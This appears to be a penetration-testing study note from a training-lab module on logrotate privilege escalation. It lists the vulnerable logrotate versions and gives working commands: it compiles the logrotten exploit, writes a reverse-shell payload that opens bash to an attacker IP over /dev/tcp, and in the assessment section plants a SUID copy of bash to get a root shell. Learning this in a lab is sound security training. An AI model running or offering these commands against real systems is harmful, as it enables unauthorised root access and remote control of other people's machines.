# Logrotate

To exploit `logrotate`, we need some requirements that we have to fulfill.

1. we need `write` permissions on the log files
2. logrotate must run as a privileged user or `root`
3. vulnerable versions:
   * 3.8.6
   * 3.11.0
   * 3.15.0
   * 3.18.0

```shellscript
# Exploit 
git clone <https://github.com/whotwagner/logrotten.git>
cd logrotten
gcc logrotten.c -o logrotten

# Make a payload to be run 
echo 'bash -i >& /dev/tcp/10.10.14.2/9001 0>&1' > payload

# Determine what option logrotate uses
grep "create\\|compress" /etc/logrotate.conf | grep -v "#"

# Here it is the option create, we have to use the exploit adapted to this function
# Start a listener on our attacker machine and run the exploit 
./logrotten -p ./payload /tmp/tmp.log
```

Skill assessment of the end of the module :

```shellscript
# Check logrotate version 
logrotate --version

# Check if there is a root cron job running logrotate
./pspy64

# Find the log file which is being rotated and check we have write permission over it

# Create an exploit to copy /bin/bash and put a suid over it
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > payloadfile

# Run the exploit in the background
./logrotten -p ./payloadfile /home/htb-student/backups/access.log &

# Write to the log file to trigger the rotation
echo "hacked" > /home/htb-student/backups/access.log

# Then deploy the shell => -p to keep the privileges
/tmp/bash -p 
```
